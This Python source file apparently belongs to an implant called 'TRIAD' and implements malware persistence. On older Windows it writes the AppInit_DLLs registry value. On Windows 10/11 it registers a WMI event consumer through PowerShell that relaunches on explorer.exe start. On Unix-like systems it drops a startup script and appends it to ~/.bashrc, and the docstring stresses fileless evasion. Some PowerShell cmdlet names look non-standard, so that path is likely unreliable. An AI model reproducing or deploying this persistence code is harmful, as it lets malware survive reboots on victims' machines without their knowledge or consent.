import platform
import subprocess
import os
# registry only exists on Windows
if os.name == 'nt':
    import winreg
else:
    winreg = None
import ctypes


def deploy_persistence():
    """Deploy a persistence mechanism appropriate for the host OS.

    - Legacy (Windows <10): modify AppInit_DLLs to point to TRIAD DLL
enabling automatic injection in every user32.dll load.
    - Modern (Windows 10/11): register a WMI permanent event consumer that
      listens for process start events and reinvokes TRIAD when explorer.exe
      (or another trusted process) is created.

    This implementation uses pure ctypes/registry commands and fileless
    PowerShell invocations; no binaries are dropped to disk.
    """
    release = platform.release()
    try:
        major = int(release.split(".")[0])
    except Exception:
        major = 0

    if os.name == 'nt' and winreg:
        if major < 10:
            # Legacy path: AppInit_DLLs
            try:
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    # TRIAD itself is memory-resident; use a placeholder for illustration
                    winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, "triad.dll")
                    winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
            except Exception as e:
                raise RuntimeError(f"Failed to configure AppInit_DLLs: {e}")
        else:
            # Modern path: create WMI Event Consumer via PowerShell
            # this requires admin; use shell command for brevity
            ps = (
                "$filter = New-WmiEventFilter -Name TRIADProcStart -Query \"SELECT * "
                "FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'\";"
                "$action = New-WmiEventConsumer -Name TRIADAction -CommandLineTemplate \"python -c 'import triad_console; triad_console.repl()'\";"
                "Register-WmiEvent -Filter $filter -Consumer $action"
            )
            subprocess.run(["powershell", "-Command", ps], capture_output=True)
    else:
        # Linux/macOS persistence: add a small shell script and ensure it is
        # executed on login via ~/.bashrc
        cfg = os.path.expanduser("~/.config/triad")
        os.makedirs(cfg, exist_ok=True)
        sh = os.path.join(cfg, "startup.sh")
        with open(sh, "w") as f:
            f.write("#!/bin/sh\npython3 -m triad_console &\n")
        os.chmod(sh, 0o755)
        bashrc = os.path.expanduser("~/.bashrc")
        try:
            with open(bashrc, "a") as f:
                f.write(f"\n# TRIAD persistence\n{sh}\n")
        except Exception:
            pass


def _coinit():
    """Helper to initialise COM with ctypes."""
    if os.name != 'nt':
        raise RuntimeError("COM initialisation is Windows-only")
    ole32 = ctypes.windll.ole32
    ole32.CoInitialize(None)
    return ole32
